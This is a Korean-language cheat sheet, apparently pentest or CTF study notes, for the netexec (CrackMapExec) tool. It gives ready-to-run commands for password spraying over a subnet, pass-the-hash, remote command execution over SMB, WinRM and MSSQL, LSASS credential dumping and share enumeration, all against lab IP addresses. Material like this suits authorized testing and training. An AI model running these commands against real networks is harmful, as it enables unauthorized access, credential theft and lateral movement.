# CrackMapExec → netexec (nxc)

- netexec(nxc) — CrackMapExec의 유지보수 후속 프로젝트. SMB·WinRM·MSSQL·LDAP·FTP 등 프로토콜별 모듈로 자격증명 검증·명령 실행·열거를 한 줄로 수행하는 스위스 아미 나이프. 명령어는 `nxc`, 구 문서의 `crackmapexec`/`cme`는 옵션 구조가 거의 같다.
- 사용자명·패스워드·해시 목록을 확보했을 때 "이 크리덴셜이 어느 호스트에서 통하는지"를 대량 검증할 때, 그리고 통하는 호스트에서 곧바로 명령을 실행할 때.
- Kali에 `apt install netexec` (또는 pip). 대상 호스트 목록과 크리덴셜 필요. SMB(445)가 닿는지가 기본 전제이며 로컬 관리자 권한이 있어야 명령 실행이 된다.

## 설치

```bash
sudo apt install netexec
nxc --version
# 구 명령어 습관이면 별칭을 만들어 둔다
# alias cme='nxc'
```

## 크리덴셜 검증 (가장 많이 쓰는 용도)

```bash
nxc smb 10.10.10.161 -u fsmith -p 'Thestuffs'
# 서브넷 전체를 한 번에 검증
nxc smb 10.10.10.0/24 -u fsmith -p 'Thestuffs'
# 목파일 대입 — user.txt x pass.txt 전체 조합
nxc smb 10.10.10.0/24 -u users.txt -p passwords.txt
```

- 성공 판정: `STATUS_OK`가 아니라 `[+]` 마크가 뜬 줄. `[+] DOMAIN\user:pass` 형태로 유효한 조합만 표시된다.
- `-f`로 호스트 파일 지정, `--port`로 445가 아닌 SMB 포트 지정이 가능하다.

## 패스-the-해시

```bash
nxc smb 10.10.10.161 -u administrator -H <NTLM해시>
nxc smb 10.10.10.0/24 -u administrator -H <NTLM해시> --local-auth
```

- `-H`: NTLM 해시(NTHash 32자) 인증. `--local-auth`는 도메인 가입 여부와 무관하게 로컬 계정으로 인증한다.

## 명령 실행

```bash
# -x: cmd 명령, --exec-method 옵션
nxc smb 10.10.10.161 -u administrator -p 'Pass' -x "whoami"
nxc smb 10.10.10.161 -u administrator -p 'Pass' -x "type C:\Users\administrator\Desktop\flag.txt"
```

- 명령 실행이 되려면 그 계정이 대상 호스트의 로컬 Administrators여야 한다. `[+]`는 나오지만 명령이 안 나오면 권한 부족이다.
- SMB 기본 실행 방식은 wmiexec와 유사하다. 서비스 생성 방식이 필요하면 `--exec-method smbexec`를 붙인다.

## 다른 프로토콜

```bash
nxc winrm 10.10.10.161 -u fsmith -p 'Thestuffs' -x "hostname"
nxc mssql 10.10.10.161 -u sa -p 'Pass' -x "whoami"
nxc ldap 10.10.10.161 -u fsmith -p 'Thestuffs' -M windapsearch
nxc ftp 10.10.10.161 -u anonymous -p ''
```

- `winrm`은 5985, `mssql`은 1433 등 프로토콜마다 기본 포트가 다르다. 열거된 포트에 맞춰 모듈을 고른다.
- `-M <모듈명>`: 열거용 모듈(예: `-M bloodhound`, `-M lsassy`로 LSASS 덤프 자격증명 수집).

## 열거·수집 팁

```bash
# 공유 열거
nxc smb 10.10.10.161 -u fsmith -p 'Thestuffs' --shares
# 특정 공유 파일 나열/다운로드
nxc smb 10.10.10.161 -u fsmith -p 'Thestuffs' --share backups --dir
# 패스워드 정책
nxc smb 10.10.10.161 -u guest -p '' --pass-pol
# 로컬 사용자 목록
nxc smb 10.10.10.161 -u fsmith -p 'Thestuffs' --users
```

## 트러블슈팅

- STATUS_ACCESS_DENIED가 계속 나오면 계정이 로그인 권한이 없거나 SMB 서명·계정 정책 문제다. guest 계정으로 `--users`·`--pass-pol`은 익명 열거가 될 때도 있다.
- 명령 실행이 안 되면 `[+]`와 실행 권한을 구분해야 한다. 로컬 관리자인지 netexec 자체가 `Pwn3d!`로 알려준다.
- 호스트가 안 잡히면 445가 닫혀 있거나 방화벽이다. nxc는 포트 스캐너가 아니므로 nmap으로 먼저 확인한다.
- 도구가 사라졌다는 메시지가 나오면 crackmapexec 대신 netexec 설치 여부를 확인한다. 같은 도구의 이름만 바뀐 버전이다.
